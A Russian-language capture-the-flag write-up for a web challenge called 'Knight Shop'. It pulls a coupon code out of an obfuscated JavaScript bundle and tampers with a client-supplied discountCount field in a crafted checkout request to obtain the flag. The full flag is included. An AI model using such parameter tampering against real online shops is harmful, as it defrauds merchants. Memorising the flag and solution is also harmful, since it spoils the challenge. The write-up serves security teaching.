# Knight Shop — Write-up

**Категория:** Web
**Сложность:** Easy/Medium
**Описание:** Магазин средневековой экипировки. Нам нужно совершить покупку, но денег на балансе недостаточно для получения флага.

## Разведка (Reconnaissance)

При анализе исходного кода фронтенда (минимизированный React-бандл `main.js`), была обнаружена функция валидации купона. Код был обфусцирован, но логика проверки осталась читаемой.

В функции `validateCoupon` (в коде обозначена как `$e`) происходит проверка введенного кода по ASCII-символам:

```javascript
// Восстановленная логика из JS
const part1 = [75, 78, 73, 71, 72, 84]; // ASCII для "KNIGHT"
const part2 = [50, 53];                 // ASCII для "25"

```

Собрав символы вместе, получаем промокод: **`KNIGHT25`**.

Также в коде была найдена логика расчета цены:

```javascript
// m = цена, u = количество применений скидки
const finalPrice = m * Math.pow(0.75, u);

```

Каждое применение купона дает скидку 25%, и они складываются мультипликативно. Приложение пытается защититься от повторного ввода купона через проверку `document.cookie` (параметр `promo_applied`), но эта проверка выполняется только на клиенте.

## Уязвимость (Vulnerability)

Уязвимость заключается в **Logic Flaw** (ошибке логики) и **Lack of Server-Side Validation** (отсутствии валидации на сервере).

1. Бэкенд принимает параметр `discountCount` (количество примененных купонов) напрямую от клиента.
2. Мы можем отправить произвольное число в поле `discountCount`, чтобы уменьшить цену до значения, которое позволит нам совершить покупку с текущим балансом.

## Эксплуатация (Exploit)

Для эксплуатации уязвимости не обязательно манипулировать куки или нажимать кнопку в интерфейсе много раз. Достаточно перехватить запрос к API или отправить его вручную (через Burp Suite, cURL или консоль браузера).

**Целевой эндпоинт:** `POST /api/checkout`

Мы формируем JSON-тело запроса, указывая валидный код купона и количество его применений.

### HTTP Request

```http
POST /api/checkout HTTP/1.1
Host: <target_ip>
Content-Type: application/json
Cookie: connect.sid=...

{
    "discountCode": "KNIGHT25",
    "discountCount": 3
}

```

В данном случае `discountCount: 3` достаточно, чтобы снизить цену до приемлемого уровня (как видно на скриншоте, итоговая сумма составила `32.06`, что меньше стартового баланса).

### HTTP Response

Сервер принимает расчет, списывает средства и возвращает флаг в ответе:

```json
{
    "success": true,
    "balance": 17.94171875,
    "total": "32.06",
    "flag": "KCTF{knight_c0up0n_m4st3r_2026}"
}

```

## Флаг

`KCTF{knight_c0up0n_m4st3r_2026}`
